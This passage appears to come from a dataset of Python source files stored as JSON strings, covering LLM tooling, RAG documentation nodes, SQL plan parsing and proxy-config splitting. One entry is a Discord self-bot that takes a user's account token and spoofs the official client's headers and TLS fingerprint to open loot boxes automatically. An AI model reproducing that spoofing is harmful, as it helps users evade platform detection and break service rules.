= create_quantization_config_from_flags()\n  # Derive sharding_config_path if it's not given by user.\n  sharding_file_name = FLAGS.sharding_config\n  if not sharding_file_name:\n    sharding_file_name = (\n        \"llama\" if FLAGS.model_name.startswith(\"llama\") else \"gemma\"\n    )\n    if (\n        quant_config.enable_weight_quantization\n        and quant_config.is_blockwise_weight\n    ):\n      sharding_file_name += \"-blockwise-quant\"\n    sharding_file_name = os.path.join(\n        \"default_shardings\", sharding_file_name + \".yaml\"\n    )\n\n  engine = create_pytorch_engine(\n      model_name=FLAGS.model_name,\n      devices=devices,\n      tokenizer_path=FLAGS.tokenizer_path,\n      ckpt_path=FLAGS.checkpoint_path,\n      bf16_enable=FLAGS.bf16_enable,\n      param_size=FLAGS.size,\n      context_length=FLAGS.context_length,\n      batch_size=FLAGS.batch_size,\n      quant_config=quant_config,\n      max_cache_length=FLAGS.max_cache_length,\n      sharding_config=sharding_file_name,\n      shard_on_batch=FLAGS.shard_on_batch,\n  )\n\n  print(\"Initialize engine\", time.perf_counter() - start)\n  return engine\n",
    "import json\nimport sys\nimport os\nimport inspect\nimport csv\nimport nest_asyncio\nimport logging\nimport phoenix as px\nfrom enum import Enum\nfrom typing import Any, Dict, Tuple\nfrom pathlib import Path\nfrom llama_index.core import SimpleDirectoryReader, Settings, VectorStoreIndex, StorageContext, load_index_from_storage\nfrom llama_index.core.node_parser import CodeSplitter\nfrom llama_index.llms.openai import OpenAI\nfrom llama_index.llms.openai.utils import ALL_AVAILABLE_MODELS\nfrom llama_index.embeddings.openai import OpenAIEmbedding, OpenAIEmbeddingModelType\nfrom .utils import get_all_nodes_packs, json2markdown\nfrom .query_engine import NodeQueryEngine\nfrom . import MAIN_CACHE, NAME\nfrom loguru import logger\n\n\n# for phoenix logging\nimport llama_index.core\n\nuse_phoenix = os.getenv(\"ENABLE_PHOENIX_LOGGING\", \"false\").lower() == \"true\"\n\n# set this env var to true if you want llm traces to be collected and displayed in phoenix\nif use_phoenix:\n    # llama-index applications will run as usual, llm calls logs will be available at http://127.0.0.1:6006/\n    llama_index.core.set_global_handler(\"arize_phoenix\")\n\nnest_asyncio.apply()\n\n# disable annoying logs from openai requests\nlogging.getLogger(\"httpx\").setLevel(logging.WARNING)\n\n\ndef init_phoenix() -> None:\n    \"\"\"Configures phoenix session if phoenix logging is enabled.\"\"\"\n    if not use_phoenix:\n        return\n    if type(sys.stdout).__name__ == \"ComfyUIManagerLogger\":\n        sys.stdout = sys.__stdout__\n        sys.stderr = sys.__stderr__\n        config = {\n            \"handlers\": [\n                {\"sink\": sys.stdout, \"format\": \"{time} - {message}\"},\n                {\"sink\": sys.stderr, \"format\": \"{time} - {message}\"},\n            ],\n        }\n        logger.configure(**config)\n    sess = px.active_session()\n    # clear before next run, instead of at the end, to allow debugging of outputs\n    if sess is not None:\n        sess.end()\n    px.launch_app()\n\n\ndef log_phoenix() -> None:\n    \"\"\"Logs number of tokens for the current phoenix session.\"\"\"\n    if use_phoenix:\n        return\n    from phoenix.trace.dsl import SpanQuery\n\n    query = SpanQuery().select(tokens_in=\"llm.token_count.prompt\", tokens_out=\"llm.token_count.completion\")\n    # The Phoenix Client can take this query and return the dataframe\n    info_df = px.Client().query_spans(query)\n    if info_df is not None:\n        logger.info(f\"Total tokens in: {info_df.tokens_in.sum()}. Total tokens out: {info_df.tokens_out.sum()}\")\n\n\nclass RegenerateOptions(Enum):\n    no = \"no\"\n    doc = \"doc\"\n    index_doc = \"index & doc\"\n    failed = \"failed\"\n\n\nclass LoadOpenAIModel:\n    \"\"\"Loads model and embed model. Note that this class is not responsoble for actually setting these models,\n    it only creates models objects and passes those to other classes.\"\"\"\n\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"model\": (sorted(ALL_AVAILABLE_MODELS.keys()), {\"default\": \"gpt-4-turbo-preview\"}),\n                \"temperature\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0}),\n                \"embed_model\": (\n                    sorted([x.value for x in OpenAIEmbeddingModelType]),\n                    {\"default\": \"text-embedding-3-small\"},\n                ),\n            }\n        }\n\n    RETURN_TYPES = (\"LLM_MODEL\",)\n    RETURN_NAMES = (\"Model\",)\n    FUNCTION = \"load_openai_model\"\n    CATEGORY = NAME\n\n    def load_openai_model(self, model: str, temperature: int, embed_model: str) -> Dict[str, Any]:\n        if \"OPENAI_API_KEY\" not in os.environ or os.environ[\"OPENAI_API_KEY\"] == \"\":\n            raise EnvironmentError(\n                \"\"\"The environment variable OPENAI_API_KEY is not set.\nPlease set it before proceeding (refer to the ENV_VARIABLE_GUIDE.md for details).\"\"\"\n            )\n        llm = OpenAI(model=model, temperature=temperature)\n        embed_model = OpenAIEmbedding(model=embed_model)\n        return ({\"llm\": llm, \"embed_model\": embed_model},)\n\n\ncomfy_nodes_index: VectorStoreIndex | None = None\n\n\nclass DocumentPack:\n    \"\"\"Wraps documentation functionality for any pack of nodes currently available in the system.\"\"\"\n\n    @classmethod\n    def get_all_names(cls):\n        cls.all_packs = get_all_nodes_packs()\n        return [f\"{pack_name}/{len(pack['nodes'])} nodes\" for pack_name, pack in cls.all_packs.items()]\n\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"name\": [\n                    sorted(cls.get_all_names()),\n                ],\n                \"chunk_lines\": (\"INT\", {\"default\": 40}),\n                \"chunk_lines_overlap\": (\"INT\", {\"default\": 15}),\n                \"max_chars\": (\"INT\", {\"default\": 1500}),\n                \"num_retries\": (\"INT\", {\"default\": 5}),\n                \"top_k\": (\"INT\", {\"default\": 10}),\n                \"regenerate\": ([e.value for e in RegenerateOptions], {\"default\": RegenerateOptions.no.value}),\n                \"save_markdown\": (\"BOOLEAN\", {\"default\": True}),\n                \"model\": (\"LLM_M",
    "import spacy\r\nfrom spacy.matcher import Matcher\r\nfrom spacy.tokens import Doc, Span\r\n\r\nclass TaskManager:\r\n    def __init__(self, nlp):\r\n        self.nlp = nlp\r\n        self.matcher = Matcher(nlp.vocab)\r\n        self.add_patterns()\r\n\r\n    def add_patterns(self):\r\n        task_pattern = [{\"POS\": \"VERB\"}, {\"POS\": \"NOUN\"}]\r\n        due_date_pattern = [{\"LOWER\": \"due\"}, {\"LOWER\": \"on\"}, {\"ENT_TYPE\": \"DATE\"}]\r\n        priority_pattern = [{\"LOWER\": \"priority\"}, {\"LOWER\": \"is\"}, {\"ENT_TYPE\": \"ORDINAL\"}]\r\n        category_pattern = [{\"LOWER\": \"category\"}, {\"LOWER\": \"is\"}, {\"POS\": \"NOUN\"}]\r\n        assignee_pattern = [{\"LOWER\": \"assignee\"}, {\"LOWER\": \"is\"}, {\"POS\": \"PROPN\"}]\r\n\r\n        self.matcher.add(\"TASK\", [task_pattern])\r\n        self.matcher.add(\"DUE_DATE\", [due_date_pattern])\r\n        self.matcher.add(\"PRIORITY\", [priority_pattern])\r\n        self.matcher.add(\"CATEGORY\", [category_pattern])\r\n        self.matcher.add(\"ASSIGNEE\", [assignee_pattern])\r\n\r\n    def extract_tasks(self, text):\r\n        doc = self.nlp(text)\r\n        matches = self.matcher(doc)\r\n        tasks = []\r\n\r\n        for match_id, start, end in matches:\r\n            label = self.nlp.vocab.strings[match_id]\r\n            span = doc[start:end]\r\n\r\n            if label == \"TASK\":\r\n                task_text = span.text\r\n                tasks.append({\"task\": task_text, \"status\": \"pending\"})\r\n            elif label == \"DUE_DATE\":\r\n                due_date = doc[end-1].text\r\n                tasks[-1][\"due_date\"] = due_date\r\n            elif label == \"PRIORITY\":\r\n                priority = doc[end-1].text\r\n                tasks[-1][\"priority\"] = priority\r\n            elif label == \"CATEGORY\":\r\n                category = doc[end-1].text\r\n                tasks[-1][\"category\"] = category\r\n            elif label == \"ASSIGNEE\":\r\n                assignee = doc[end-1].text\r\n                tasks[-1][\"assignee\"] = assignee\r\n\r\n        return tasks\r\n\r\n    def update_task_status(self, task, status):\r\n        task[\"status\"] = status\r\n        return task\r\n\r\n    def filter_tasks_by_category(self, tasks, category):\r\n        filtered_tasks = [task for task in tasks if task.get(\"category\") == category]\r\n        return filtered_tasks\r\n\r\n    def filter_tasks_by_assignee(self, tasks, assignee):\r\n        filtered_tasks = [task for task in tasks if task.get(\"assignee\") == assignee]\r\n        return filtered_tasks\r\n\r\n    def filter_tasks_by_status(self, tasks, status):\r\n        filtered_tasks = [task for task in tasks if task.get(\"status\") == status]\r\n        return filtered_tasks\r\n\r\n    def sort_tasks_by_priority(self, tasks):\r\n        priority_order = {\"high\": 3, \"medium\": 2, \"low\": 1}\r\n        sorted_tasks = sorted(tasks, key=lambda x: priority_order.get(x.get(\"priority\"), 0), reverse=True)\r\n        return sorted_tasks\r\n\r\n    def generate_task_summary(self, tasks):\r\n        total_tasks = len(tasks)\r\n        pending_tasks = len(self.filter_tasks_by_status(tasks, \"pending\"))\r\n        in_progress_tasks = len(self.filter_tasks_by_status(tasks, \"in progress\"))\r\n        completed_tasks = len(self.filter_tasks_by_status(tasks, \"completed\"))\r\n\r\n        summary = f\"Task Summary:\\n\"\r\n        summary += f\"Total Tasks: {total_tasks}\\n\"\r\n        summary += f\"Pending Tasks: {pending_tasks}\\n\"\r\n        summary += f\"In Progress Tasks: {in_progress_tasks}\\n\"\r\n        summary += f\"Completed Tasks: {completed_tasks}\\n\"\r\n\r\n        return summary",
    "import requests\n\n# Fetch the content of the URL\nurl = \"https://raw.githubusercontent.com/Surfboardv2ray/TGParse/main/configtg.txt\"\n\ntry:\n    response = requests.get(url)\n    response.raise_for_status()  # Raise an exception if the request was unsuccessful\nexcept requests.exceptions.RequestException as e:\n    print(f\"An error occurred while fetching the URL: {e}\")\nelse:\n    content = response.text\n\n    # Separate the subscriptions based on the v2ray type\n    subscriptions = content.splitlines()\n    vmess = [s for s in subscriptions if s.startswith('vmess://')]\n    vless = [s for s in subscriptions if s.startswith('vless://')]\n    trojan = [s for s in subscriptions if s.startswith('trojan://')]\n    ss = [s for s in subscriptions if s.startswith('ss://')]\n    socks = [s for s in subscriptions if s.startswith('socks://')]\n    hysteria2 = [s for s in subscriptions if s.startswith('hysteria2://')]\n    hy2 = [s for s in subscriptions if s.startswith('hy2://')]\n    tuic = [s for s in subscriptions if s.startswith('tuic://')]\n    hysteria = [s for s in subscriptions if s.startswith('hysteria://')]\n    naive = [s for s in subscriptions if s.startswith('naive+')]\n\n    # Write the results to separate files\n    with open('python/vmess', 'w') as f:\n        f.write('\\n'.join(vmess))\n    with open('python/vless', 'w') as f:\n        f.write('\\n'.join(vless))\n    with open('python/trojan', 'w') as f:\n        f.write('\\n'.join(trojan))\n    with open('python/ss', 'w') as f:\n        f.write('\\n'.join(ss))\n    with open('python/socks', 'w') as f:\n        f.write('\\n'.join(socks))\n    with open('python/hysteria2', 'w') as f:\n        f.write('\\n'.join(hysteria2))\n    with open('python/hy2', 'w') as f:\n        f.write('\\n'.join(hy2))\n    with open('python/tuic', 'w') as f:\n        f.write('\\n'.join(tuic))\n    with open('python/hysteria', 'w') as f:\n        f.write('\\n'.join(hysteria))\n    with open('python/naive', 'w') as f:\n        f.write('\\n'.join(naive))\n\n\n\n\n\n                \n",
    "# @TIME : 12/7/23 5:33 PM\n# @AUTHOR : LZDH\nimport subprocess\nimport json\n# import numpy as np\n\n# example 1 (?)\n# sql_input = \"SELECT MAX(distinct l_orderkey) FROM lineitem where exists( SELECT MAX(c_custkey) FROM customer where c_custkey = l_orderkey GROUP BY c_custkey )\";\n# rule_input = ['Aggregate_project_merge'.upper(), 'Project_Merge'.upper()]\n# example 2 (good)\n# sql_input = \"SELECT (SELECT o_orderdate FROM orders limit 1 offset 6 ) AS c0 from region as ref_0 where false limit 76\"\n# rule_input = ['Sort_Project_Transpose'.upper(), 'Project_To_Calc'.upper()]\n# example 3 (good)\n# sql_input = \"select distinct l_orderkey, sum(l_extendedprice + 3 + (1 - l_discount)) as revenue, o_orderkey, o_shippriority from customer, orders, lineitem where c_mktsegment = 'BUILDING' and c_custkey = o_custkey and l_orderkey = o_orderkey and o_orderdate < date '1995-03-15' and l_shipdate > date '1995-03-15' group by l_orderkey, o_orderkey, o_shippriority order by revenue desc, o_orderkey\"\n# rule_input = ['Filter_Into_Join'.upper(), 'Project_To_Calc'.upper(), 'Join_extract_Filter'.upper()]\n# example 4\n# sql_input = \"SELECT DISTINCT COUNT ( t3.paperid ) FROM venue AS t4 JOIN paper AS t3 ON t4.venueid  =  t3.venueid JOIN writes AS t2 ON t2.paperid  =  t3.paperid JOIN author AS t1 ON t2.authorid  =  t1.authorid WHERE t1.authorname  =  'David M. Blei' AND t4.venuename  =  'AISTATS'\"\n# rule_input = ['JOIN_EXTRACT_FILTER'.upper(), 'FILTER_INTO_JOIN'.upper(), 'PROJECT_TO_CALC']\n# example 5\n# db_id = 'tpch'\n# sql_input = \"select ps_partkey, sum(ps_supplycost * ps_availqty) as calcite_value from partsupp, supplier, nation where ps_suppkey = s_suppkey and s_nationkey = n_nationkey and n_name = 'PERU' group by ps_partkey having sum(ps_supplycost * ps_availqty) > ( select sum(ps_supplycost * ps_availqty) * 0.0001000000 from partsupp, supplier, nation where ps_suppkey = s_suppkey and s_nationkey = n_nationkey and n_name = 'PERU' ) order by calcite_value desc;;\"\n# sql_input_1 = \"select ps_partkey, sum(ps_supplycost * ps_availqty) as calcite_value from partsupp, supplier, nation where ps_suppkey = s_suppkey and s_nationkey = n_nationkey and n_name = 'AKSJ' group by ps_partkey having sum(ps_supplycost * ps_availqty) > ( select sum(ps_supplycost * ps_availqty) * 0.01000000 from partsupp, supplier, nation where ps_suppkey = s_suppkey and s_nationkey = n_nationkey and n_name = 'AKSJ' ) order by calcite_value desc;;\"\n\n# sql_input = \"SELECT t1.ps_partkey, t1.value FROM (SELECT partsupp.ps_partkey, SUM(partsupp.ps_supplycost * partsupp.ps_availqty) AS value FROM partsupp, supplier, nation WHERE partsupp.ps_suppkey = supplier.s_suppkey AND supplier.s_nationkey = nation.n_nationkey AND nation.n_name = 'PERU' GROUP BY partsupp.ps_partkey) AS t1 LEFT JOIN (SELECT SUM(partsupp0.ps_supplycost * partsupp0.ps_availqty) * 0.0001000000 AS EXPR0 FROM partsupp AS partsupp0, supplier AS supplier0, nation AS nation0 WHERE partsupp0.ps_suppkey = supplier0.s_suppkey AND supplier0.s_nationkey = nation0.n_nationkey AND nation0.n_name = 'PERU') AS t5 ON TRUE WHERE t1.value > t5.EXPR0 ORDER BY t1.value DESC;\"\n\n# node_str = \"LogicalFilter(condition=[AND(=($7, 'CProxy'), >($5, 1998))]): rowcount = 4.221408232700325E11, cumulative cost = {6.051060523576132E12 rows, 5.6285445353031E12 cpu, 0.0 io}, id = 17\"\n\nreps = [\"year\", \"date\", \"rank\", \"position\", \"YEAR\", \"DATE\", \"RANK\", \"POSITION\", \"Year\", \"Date\", \"Rank\", \"Position\",\n        \"TIME\", \"Time\", \"time\", \"KEY\", \"Key\", \"key\", \"DAY\", \"Day\", \"day\", \"PER\", \"Per\", \"per\", \"RESULT\", \"Result\",\n        \"result\", \"MONTH\", \"Month\", \"month\", \"METHOD\", \"Method\", \"method\", \"RATING\", \"Rating\", \"rating\", \"CHARACTER\",\n        \"Character\", \"RANGE\", \"Range\", \"range\", \"count\"]\n\n\ndef process_plan_node(node_str, row_only):\n    operator = node_str[:node_str.index('(')]\n    operator_detail = node_str[node_str.index('('):node_str.index(': rowcount')]\n    row_count = node_str.split('rowcount = ')[1].split(',')[0]\n    cum_costs = node_str.split('cumulative cost = ')[1].split('}')[0][1:]\n    cum_rows = cum_costs.split(' rows, ')[0]\n    cum_cpu = cum_costs.split(' rows, ')[1].split(' cpu, ')[0]\n    if row_only:\n        plan_node = operator + '(' + str(row_count) + ' rows)'\n    else:\n        plan_node = {'NodeType': operator,\n                     'Node_Detail': operator_detail,\n                     'Rows': float(row_count),\n                     'Cum_Rows': float(cum_rows),\n                     'Cum_Cpu': float(cum_cpu)}\n\n    return plan_node\n\n\ndef create_nested_tree(heights, nodes, filt_meta, row_only=False):\n    if len(heights) <= 3:\n        if filt_meta:\n            return [i[:i.index('(')] for i in nodes]\n        else:\n            # print(row_only)\n            return [process_plan_node(i, row_only) for i in nodes]\n    else:\n        if filt_meta:\n            root = nodes[0][:nodes[0].index('(')]\n        else:\n            # print(row_only)\n            root = process_plan_node(nodes[0], row_only)\n        root_h = heights[0]\n        direct_subs = [i for",
    "from typing import List\nfrom llama_index.core.schema import TextNode\nfrom tqdm import tqdm\n\nfrom .constants import possible_headers\n\nWINDOW_METADATA_KEY = \"window\"\nORIGINAL_TEXT_METADATA_KEY = \"original_text\"\n\n\ndef add_window_nodes(nodes: List[TextNode], window_size: int = 3):\n    \"\"\" \"\"\"\n    for i, node in tqdm(\n        enumerate(nodes), total=len(nodes), desc=\"Adding window nodes ...\"\n    ):\n        window_nodes = nodes[\n            max(0, i - window_size) : min(i + window_size + 1, len(nodes))\n        ]\n\n        node.metadata[WINDOW_METADATA_KEY] = \"\\n\".join(\n            [n.get_content(\"llm\") for n in window_nodes]\n        )\n        node.metadata[ORIGINAL_TEXT_METADATA_KEY] = node.text\n\n        # exclude window metadata from embed and llm\n        node.excluded_embed_metadata_keys.extend(\n            [WINDOW_METADATA_KEY, ORIGINAL_TEXT_METADATA_KEY]\n        )\n\n        node.excluded_llm_metadata_keys.extend(\n            [WINDOW_METADATA_KEY, ORIGINAL_TEXT_METADATA_KEY]\n        )\n\n    # since articles metadata (like title, chapter, etc ...) will be incorporated in WINDOW_METADATA_KEY,\n    # we can exclude them from the llm metadata.\n\n    for node in nodes:\n        node.excluded_llm_metadata_keys.extend(possible_headers)\n\n    return nodes\n",
    "from typing import Tuple, List\n\nfrom lagrange.client.client import Client\nfrom satori.server import Api, Server\nfrom .utils import register_api\nfrom .types import API_HANDLER\nfrom .handler import (\n    msg_create,\n    msg_delete,\n    msg_get,\n    guild_mute,\n    guild_kick,\n    guild_get_list,\n    guild_member_get,\n    guild_member_list,\n    login_get,\n    channel_list,\n)\n\n__all__ = [\"apply_api_handlers\"]\n\nALL_APIS: List[Tuple[Api, API_HANDLER]] = [\n    (Api.MESSAGE_CREATE, msg_create),\n    (Api.MESSAGE_DELETE, msg_delete),\n    (Api.MESSAGE_GET, msg_get),\n    (Api.GUILD_MEMBER_KICK, guild_kick),\n    (Api.GUILD_MEMBER_MUTE, guild_mute),\n    (Api.GUILD_LIST, guild_get_list),\n    (Api.GUILD_MEMBER_GET, guild_member_get),\n    (Api.GUILD_MEMBER_LIST, guild_member_list),\n    (Api.LOGIN_GET, login_get),\n    (Api.CHANNEL_LIST, channel_list),\n]\n\n\ndef apply_api_handlers(\n    server: Server,\n    client: Client,\n):\n    for api, api_handler in ALL_APIS:\n        register_api(api, server, client, api_handler)\n",
    "import os\nfrom dotenv import load_dotenv\nimport anthropic\n\n# Load variables from .env file\nload_dotenv()\n\n# Get variables from environment\nbrand_name = os.getenv(\"BRAND_NAME\")\nkeywords_file_path = os.getenv(\"KEYWORDS_FILE_PATH\")\nsample_article_file_path = os.getenv(\"SAMPLE_ARTICLE_FILE_PATH\")\ncustom_collections_file_path = os.getenv(\"CUSTOM_COLLECTIONS_FILE_PATH\")\npages_file_path = os.getenv(\"PAGES_FILE_PATH\")\nproducts_file_path = os.getenv(\"PRODUCTS_FILE_PATH\")\nblogs_file_path = os.getenv(\"BLOGS_FILE_PATH\")\nanthropic_api_key = os.getenv(\"ANTHROPIC_API_KEY\")\n\n# Read the contents of the files\nwith open(keywords_file_path, \"r\", encoding=\"utf-8\") as file:\n    keywords = file.read().splitlines()\n\nwith open(sample_article_file_path, \"r\", encoding=\"utf-8\") as file:\n    sample_article = file.read()\n\nwith open(custom_collections_file_path, \"r\", encoding=\"utf-8\") as file:\n    custom_collections = file.read()\n\nwith open(pages_file_path, \"r\", encoding=\"utf-8\") as file:\n    pages = file.read()\n\nwith open(products_file_path, \"r\", encoding=\"utf-8\") as file:\n    products = file.read()\n\nwith open(blogs_file_path, \"r\", encoding=\"utf-8\") as file:\n    blogs = file.read()\n\ndef generate_article(system_prompt, user_prompt, api_key):\n    client = anthropic.Client(api_key=api_key)\n    response = client.messages.create(\n        model=\"claude-3-opus-20240229\",\n        max_tokens=4000,\n        system=system_prompt,\n        messages=[\n            {\"role\": \"user\", \"content\": user_prompt}\n        ]\n    )\n    print(\"API Response:\")\n    print(response)\n    return \"\".join(content.text for content in response.content)\n\n# Iterate over each keyword and generate an article\nfor i, keyword in enumerate(keywords, start=1):\n    # Prepare the system prompt\n    system_prompt = f\"\"\"\n    It must be at least 4 pages of content. Do not invent any links. You can write an article, just write generally and don't make any claims. Write a fully formatted article with tables, embeds, and much more. Write in as much detial as possible without repeating the same thing over and over. You are writing for {brand_name}. When writing for them, I want you to ensure to use this html embed with the collection ID of relevant collections to the article.\n\n    <div class=\"hura-collection-embedder\" data-id=\"296336228548\" data-view=\"gridview\" data-limit=\"6\" data-price=\"1\" data-label=\"1\" data-hover=\"1\" data-border=\"1\" data-sh=\"1\" data-coldk=\"4\" data-coltl=\"1\" data-colmb=\"1\" ></div>\n\n    You can change the data limit to 12 if you're doing less collections for an article.\n\n    I have included other important pages underneath the collections. Throughout the article you're writing, please use relative internal links using the handle from this list:\n\n    When writing the articles, \"{brand_name} CANNOT make a structured function claim\" - We cannot talk about any of the pharmalogical profiles that would cause \"Both can improve your well-being and comfort.\" - We cannot make medical claims such as \"helps with sleep\". Make sure to follow FDA's laws and remove any structured function claims or specific medical benefit claims.\n\n    Custom Collections:\n    {custom_collections}\n\n    Pages:\n    {pages}\n\n    Products:\n    {products}\n\n    Blogs:\n    {blogs}\n\n    Sample Article:\n    {sample_article}\n    \"\"\"\n\n    # Prepare the user prompt\n    user_prompt = f\"\"\"\n    Write a 1500 word article. Write 20 titles and 2 paragraphs per title, with formatting like tables, embeds, internal links and lists. Do not use any placeholder information. Make the content about the company - do not invent links, use at least 3 embeds and 4 collection internal links per article. Please generate an article about the keyword \"{keyword}\" based on the following information: Please be creative when writing. Focus on writing good e-magazine style selling content but from the perspective of the business. I have these products - I'm writing for {brand_name}. These are all products they sell, and collections of products they sell. I want you, by embedding images, to make a rankable SEO-Optimized listicle article about the keyword. You should use a lot of tables and other formatting. Do not use complicated language, you're writing for working class workers. Please use Sentence case. This is vital. Don't use crazy language, but give a lot of interesting formatting and make it like a journal style advertising the specific products. In the article, please embed some of these collections. I have included the collections in the prompt as well. Please use headers such as # h1 on the top header and then ## h2 and h3 ### throughout the article and be considerate about where you place both the collection embeds and the collection links, and that you use appropriate SEO-Optimized anchor text for internal links. Don't be repetitive. When writing the articles - GPT needs to filter/say \"{brand_name} CANNOT make a structured function claim\" - We cannot talk about any of the pharmalogical profiles than would cause \"Both can improve your we",
    "import tls_client\nimport time\nimport datetime\nimport os, random\n\nred = '\\x1b[31m(-)\\x1b[0m'\nblue = '\\x1b[34m(+)\\x1b[0m'\ngreen = '\\x1b[32m(+)\\x1b[0m'\nyellow = '\\x1b[33m(!)\\x1b[0m'\n\ndef get_timestamp():\n    time_idk = datetime.datetime.now().strftime('%H:%M:%S')\n    timestamp = f'[\\x1b[90m{time_idk}\\x1b[0m]'\n    return timestamp\n\nclass DiscordSession:\n    def __init__(self, client_identifier=\"chrome112\"):\n        self.session = tls_client.Session(client_identifier=client_identifier, random_tls_extension_order=True)\n\n    def post(self, url, headers):\n        return self.session.post(url, headers=headers)\n\nclass LootBoxOpener:\n    lootbox_items = {\n        \"1214340999644446726\": \"Quack!!\",\n        \"1214340999644446724\": \"\u2b95\u2b06\u2b07\u2b95\u2b06\u2b07\",\n        \"1214340999644446722\": \"Wump Shell\",\n        \"1214340999644446720\": \"Buster Blade\",\n        \"1214340999644446725\": \"Power Helmet\",\n        \"1214340999644446723\": \"Speed Boost\",\n        \"1214340999644446721\": \"Cute Plushie\",\n        \"1214340999644446728\": \"Dream Hammer\",\n        \"1214340999644446727\": \"OHHHHH BANANA\"\n    }\n\n    def __init__(self, discord_session, token):\n        self.discord_session = discord_session\n        self.token = token\n        self.headers = {\n            'authority': 'discord.com',\n            'accept': '*/*',\n            'accept-language': 'en-US',\n            'authorization': token,\n            'origin': 'https://discord.com',\n            'referer': 'https://discord.com/channels/1222747973205758002/1224417703100551169',\n            'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"',\n            'sec-ch-ua-mobile': '?0',\n            'sec-ch-ua-platform': '\"Windows\"',\n            'sec-fetch-dest': 'empty',\n            'sec-fetch-mode': 'cors',\n            'sec-fetch-site': 'same-origin',\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9037 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36',\n            'x-debug-options': 'bugReporterEnabled',\n            'x-discord-locale': 'en-US',\n            'x-discord-timezone': 'Asia/Calcutta',\n            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDM3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MzEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMzcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyODA3MDAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjQ1MzY5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',\n        }\n\n    def open_lootbox(self):\n        response = self.discord_session.post('https://discord.com/api/v9/users/@me/lootboxes/open', headers=self.headers)\n        if 'rate limited' in response.text:\n            print(f\"{get_timestamp()} {yellow} You Are Being Rate Limited!\")\n            time.sleep(2)\n        elif response.status_code == 200:\n            opened_item = response.json().get('opened_item')\n            if opened_item in self.lootbox_items:\n                print(f\"{get_timestamp()} {green} Successfully Opened A Lootbox : {self.lootbox_items[opened_item]}\")\n                time.sleep(random.uniform(7, 10))\n            else:\n                print(f\"{get_timestamp()} {red} An Unknown Item Was Received.\")\n        else:\n            print(f'{get_timestamp()} {red} An Error Occurred : {response.status_code} - {response.text}')\n\ndef main():\n    token = input(f\"{get_timestamp()} {blue} Please Enter Your Account Token : \")\n    discord_session = DiscordSession()\n    lootbox_opener = LootBoxOpener(discord_session, token)\n    \n    while True:\n        lootbox_opener.open_lootbox()\n        time.sleep(1)\n\nif __name__ == \"__main__\":\n    os.system(\"cls\")\n    main()\n",
    "import json\n\n# Load your data\nwith open('full_data_0728.json', 'r') as f:\n    data = json.load(f)\n\n# Create a list to hold the new dictionaries\nnew_data = []\n\n# Loop through your data to extract and rearrange the necessary information\nfor entry in data:\n    # If \"rlhf_reward_model\" is present and not empty, reorder the values\n    if \"rlhf_reward_model\" in entry and entry[\"rlhf_reward_model\"]:\n        # Get the sorted order of indices based on rlhf_reward_model\n        sorted_order = sorted(range(len(entry[\"rlhf_reward_model\"])), key=lambda k: entry[\"rlhf_reward_model\"][k], reverse=True)\n\n        # Reorder the lists based on this order\n        entry[\"completions\"] = [entry[\"completions\"][i] for i in sorted_order]\n        entry[\"rewards\"] = [entry[\"rewards\"][i] for i in sorted_order]\n        entry[\"diversity_reward_model\"] = [entry[\"diversity_reward_model\"][i] for i in sorted_order]\n        entry[\"reciprocate_reward_model\"] = [entry[\"reciprocate_reward_model\"][i] for i in sorted_order]\n        entry[\"rlhf_reward_model\"] = [entry[\"rlhf_reward_model\"][i] for i in sorted_order] \n        entry[\"relevance_filter\"] = [entry[\"relevance_filter\"][i] for i in sorted_order]\n\n\n    # Add the updated entry to the new_data list\n    new_data.append(entry)\n\n# Convert the new_data list of dictionaries into a new JSON file\nwith open('completions_data_sorted.json', 'w') as f:\n    json.dump(new_data, f, indent=3)\n",
    "from typing import List, Any\nfrom langchain_core.exceptions import OutputParserException\nfrom langchain_core.output_parsers import BaseOutputParser\nfrom langchain_core.outputs import Generation, ChatGeneration\n\n\n# Will be deprecated\nclass AnthropicOutputParser(BaseOutputParser):\n    @property\n    def _type(self) -> str:\n        return \"json_functions\"\n\n    def parse(self, text: str) -> Any:\n        raise NotImplementedError()\n\n    def parse_result(self, result: List[Generation], *, partial: bool = False) -> Any:\n        if len(result) != 1:\n            raise OutputParserException(\n                f\"Expected exactly one result, but got {len(result)}\"\n            )\n        generation = result[0]\n        if not isinstance(generation, ChatGeneration):\n            raise OutputParserException(\n                \"This output parser can only be used with a chat generation.\"\n            )\n        message = generation.message\n        # print(f\"message: {message}\")\n\n        if \"<invoke>\" in message.content:\n            start_tag = \"<invoke>\"\n            end_tag = \"</invoke>\"\n            invoke_text = message.content[\n                          message.content.find(start_tag) + len(start_tag):message.content.find(end_tag)\n                          ]\n            if \"<tool_name>\" in invoke_text:\n                start_tag = \"<tool_name>\"\n                end_tag = \"</tool_name>\"\n                tool_name = invoke_text[invoke_text.find(start_tag) + len(start_tag):invoke_text.find(end_tag)]\n\n                parameters = {}\n                if \"<parameters>\" in invoke_text:\n                    start_tag = \"<parameters>\"\n                    end_tag = \"</parameters>\"\n                    parameters_text = invoke_text[\n                                      invoke_text.find(start_tag) + 